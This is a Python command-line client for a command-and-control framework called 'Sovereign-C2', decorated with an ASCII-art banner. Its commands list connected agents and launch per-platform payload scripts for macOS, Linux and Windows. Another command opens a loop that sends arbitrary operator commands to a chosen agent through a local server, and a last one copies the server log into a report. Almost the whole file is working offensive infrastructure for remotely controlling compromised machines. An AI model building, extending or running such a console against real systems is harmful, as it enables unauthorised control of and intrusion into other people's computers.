import typer
import os
import subprocess
import requests


# Banner
def print_banner():
    banner = r"""
  _________                                   .__                         _________  ________             ___________                                                  __    
 /   _____/ _______  __  ____ _______   ____  |__| ____    ____           \_   ___ \ \_____  \            \_   _____/____________     _____   ______  _  _____________|  | __
 \_____  \ /  _ \  \/ /_/ __ \\_  __ \_/ __ \ |  |/ ___\  /    \   ______ /    \  \/  /  ____/    ______   |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 /        (  <_> )   / \  ___/ |  | \/\  ___/ |  / /_/  >|   |  \ /_____/ \     \____/       \   /_____/   |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
/_______  /\____/ \_/   \___  >|__|    \___  >|__\___  / |___|  /          \______  /\_______ \            \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                  \/             \/   /_____/       \/                  \/         \/                \/                \/       \/     \/                        \/

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

           Sovereign-C2 Framework
    """
    print(banner)
    print("Sovereign-c2 - 41PH4-01 & Our Community\n")

cli = typer.Typer()

@cli.command("list-agents")
def list_agents_cli():
    response = requests.get("http://127.0.0.1:8000/list_agents")
    agents = response.json().get("agents", [])
    for agent in agents:
        typer.echo(f"Agent ID: {agent['AgentID']}")

@cli.command("deploy-payload")
def deploy_payload(agent_type: str):
    project_root = os.path.dirname(os.path.abspath(__file__))
    payload_dir = os.path.join(project_root, "../payloads")
    
    if agent_type == "macos":
        # Execute macOS payload
        subprocess.run([os.path.join(payload_dir, "macos_payload.sh")])
    elif agent_type == "linux":
        # Execute Linux payload
        subprocess.run([os.path.join(payload_dir, "linux_payload.sh")])
    elif agent_type == "windows":
        # Execute Windows payload
        subprocess.run(["powershell.exe", os.path.join(payload_dir, "windows_payload.ps1")])
    else:
        typer.echo("Unknown agent type. Please specify 'macos', 'linux', or 'windows'.")

@cli.command("select-agent")
def select_agent(agent: str = typer.Argument(None, help="The ID of the agent")):
    if agent is None:
        response = requests.get("http://127.0.0.1:8000/list_agents")
        agents = response.json().get("agents", [])
        agent_ids = [agent['AgentID'] for agent in agents]
        if not agent_ids:
            typer.echo("No agents available.")
            return

        agent_id = typer.prompt("Select an agent", type=typer.Choice(agent_ids))
    else:
        agent_id = agent

    while True:
        command = typer.prompt(f"Enter command to send to agent {agent_id} (or 'exit' to stop)")
        if command.lower() == "exit":
            break
        response = requests.post("http://127.0.0.1:8000/sendcommand", json={"AgentID": agent_id, "Command": command})
        typer.echo(f"Command '{command}' sent to agent {agent_id}")

@cli.command("generate-report")
def generate_report():
    with open('c2_server.log', 'r') as log_file, open('report.txt', 'w') as report_file:
        report_file.write(log_file.read())
    typer.echo("Report generated as report.txt")

if __name__ == "__main__":
    cli()

